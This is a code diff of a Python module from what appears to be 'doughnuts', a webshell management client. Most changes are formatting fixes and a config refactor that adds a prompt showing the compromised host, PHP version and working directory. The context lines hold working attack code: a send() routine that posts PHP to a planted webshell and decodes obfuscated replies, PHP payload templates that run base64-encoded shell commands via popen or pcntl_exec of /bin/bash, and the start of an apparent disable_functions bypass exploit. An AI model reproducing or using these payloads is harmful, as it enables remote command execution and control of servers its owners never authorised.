@@ -1,4 +1,5 @@
 from os import path
+from .runtime_config import CONFIG
 from re import match, sub
 from base64 import b64decode, b64encode
 from binascii import b2a_hex
@@ -9,7 +10,7 @@ from random import choice, randint, sample
 from string import ascii_letters, digits
 from subprocess import Popen, check_output
 from types import MethodType
-from urllib.parse import quote,unquote_plus
+from urllib.parse import quote, unquote_plus
 from hashlib import md5
 from uuid import uuid4
 from codecs import getencoder
@@ -22,7 +23,7 @@ from requests.utils import guess_json_utf
 from urllib3 import disable_warnings
 
 from libs.config import color, gget, gset
-from libs.debug import DEBUG
+from libs.runtime_config import CONFIG
 
 LEVEL = []
 CONNECT_PIPE_MAP = {True: "│  ", False: "   "}
@@ -100,7 +101,7 @@ def hex_encode(data: str):
 def md5_file(file_path: str):
     md5_hash = None
     if path.isfile(file_path):
-        f = open(file_path,'rb')
+        f = open(file_path, 'rb')
         md5_obj = md5()
         md5_obj.update(f.read())
         hash_code = md5_obj.hexdigest()
@@ -122,7 +123,7 @@ def gzinflate(compressed: bytes) -> bytes:
     return zlib.decompress(compressed, -zlib.MAX_WBITS) if compressed else b''
 
 
-def gzdeflate(data: bytes) -> bytes: 
+def gzdeflate(data: bytes) -> bytes:
     compressor = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS)
     compressed = compressor.compress(data)
     compressed += compressor.flush()
@@ -135,6 +136,7 @@ def size_to_human(num, suffix='B'):
             return "%3.1f %s%s" % (num, unit, suffix)
         num /= 1024.0
     return "%.1f%s%s" % (num, 'Yi', suffix)
+
 
 def human_to_size(size):
     size = size.upper()
@@ -229,6 +231,14 @@ def fake_referer():
         return f"https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}"
 
 
+def set_prompt():
+    verbose = CONFIG['VERBOSE']
+    prompt = f"doughnuts ({color.cyan(gget('webshell.netloc', 'webshell'))}) > "
+    if verbose:
+        prompt = f"{color.green('PHP ' + gget('webshell.php_version', 'webshell'))}    {color.yellow(gget('webshell.pwd', 'webshell'))}\n" + prompt
+    gset("webshell.prompt", prompt)
+
+
 def get_db_connect_code(host="", username="", password="", dbname="", port=""):
     host = host if host else gget("db_host", "webshell", "")
     username = username if username else gget("db_username", "webshell", "")
@@ -298,6 +308,7 @@ def execute_sql_command(command, database: str = "", raw: bool = False):
         return form
     return ''
 
+
 def decode_g(result, key: str, options: bool):
     try:
         s = result.decode()
@@ -311,7 +322,8 @@ def decode_g(result, key: str, options: bool):
 
     for c in range(1, klen):
         for k in range(klen):
-            key = key[:k] + chr((ord(key[(k + 1) % klen]) ^ ord(key[k]))) + key[k + 1:]
+            key = key[:k] + chr((ord(key[(k + 1) % klen]) ^
+                                 ord(key[k]))) + key[k + 1:]
         keys.append(key)
 
     for ct in range(klen - 1, -1, -1):
@@ -331,6 +343,7 @@ def decode_g(result, key: str, options: bool):
     except UnicodeDecodeError:
         return b"" if options else ""
 
+
 def send(phpcode: str, raw: bool = False, **extra_params):
     # extra_params['quiet'] 不显示错误信息
     offset = 8
@@ -339,7 +352,7 @@ def send(phpcode: str, raw: bool = False, **extra_params):
     if ("quiet" in extra_params):
         del extra_params["quiet"]
         quiet = True
-    
+
     url = gget("webshell.url", "webshell")
     params_dict = gget("webshell.params_dict", "webshell").copy()
     php_v7 = gget("webshell.v7", "webshell")
@@ -422,10 +435,10 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + phpcode
     req.r_text = text[text_head_offset: text_tail_offset]
     req.r_content = content[con_head_offset: con_tail_offset]
     if (not raw and encode_recv):
-        req.r_text = decode_g(req.r_text,RAND_KEY,False)
-        req.r_content = decode_g(req.r_content,RAND_KEY,True)
+        req.r_text = decode_g(req.r_text, RAND_KEY, False)
+        req.r_content = decode_g(req.r_content, RAND_KEY, True)
     req.r_json = MethodType(r_json, req)
-    if DEBUG["SEND"]:  # DEBUG
+    if CONFIG["SEND"]:  # DEBUG
         print(color.yellow(f"-----DEBUG START------"))
         print(f"[{req.status_code}] {url} length: {len(req.r_text)} ", end="")
         print(f"raw: {color.green('True')}" if raw else '')
@@ -481,7 +494,8 @@ def prepare_system_template(exec_func: str):
         SYSTEM_TEMPLATE = """$fp=popen(base64_decode("%s"),'r');$o=NULL;if(is_resource($fp)){while(!feof($fp)){$o.=fread($fp,1024);}}@pclose($fp);"""
     elif (exec_func == 'pcntl_exec'):
         filename = uuid4()
-        SYSTEM_TEMPLATE = """$r='/tmp/%s';if(pcntl_fork() === 0) {$cmd = base64_decode("%s");$args = array("-c","$cmd 2>&1 1>$r");pcntl_exec("/bin/bash", $args);exit(0);}pcntl_wait($status);$o=file_get_contents('/tmp/%s');unlink('/tmp/%s');""" % (filename, "%s", filename, filename)
+        SYSTEM_TEMPLATE = """$r='/tmp/%s';if(pcntl_fork() === 0) {$cmd = base64_decode("%s");$args = array("-c","$cmd 2>&1 1>$r");pcntl_exec("/bin/bash", $args);exit(0);}pcntl_wait($status);$o=file_get_contents('/tmp/%s');unlink('/tmp/%s');""" % (
+            filename, "%s", filename, filename)
 
 
 def get_system_code(command: str, print_result: bool = True, mode: int = 0):
@@ -1231,7 +1245,7 @@ $r->close();
 $con->close();
 }""" % (get_db_connect_code(), hex_encode(command), print_command)
     elif (bypass_df == 9):
-       return """error_reporting(E_ALL);
+        return """error_reporting(E_ALL);
  
 define('NB_DANGLING', 200);
 define('SIZE_ELEM_STR', 40 - 24 - 1);
@@ -1581,7 +1595,8 @@ def has_env(env: str, remote: bool = True):
     else:
         if (not gget("has_%s" % env)):
             try:
-                flag = check_output([command, env]).strip().decode(LOCAL_ENCODING)
+                flag = check_output(
+                    [command, env]).strip().decode(LOCAL_ENCODING)
             except Exception:
                 flag = False
             gset("has_%s" % env, flag)
